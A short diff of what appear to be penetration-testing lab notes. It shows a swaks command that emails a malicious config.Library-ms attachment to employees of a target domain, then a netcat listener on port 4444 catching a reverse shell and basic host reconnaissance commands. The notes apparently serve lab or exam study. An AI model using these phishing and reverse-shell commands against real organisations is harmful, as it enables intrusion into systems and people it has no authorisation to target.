@@ -957,8 +957,7 @@ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --a
 >sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach config.Library-ms --server 192.168.208.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
 nc -nlvp 4444>whoami
 >hostname
->ipconfig 
-#172.16.120.243
+>ipconfig # check IP Address
 ```
 
 ## LDAP Enumeration
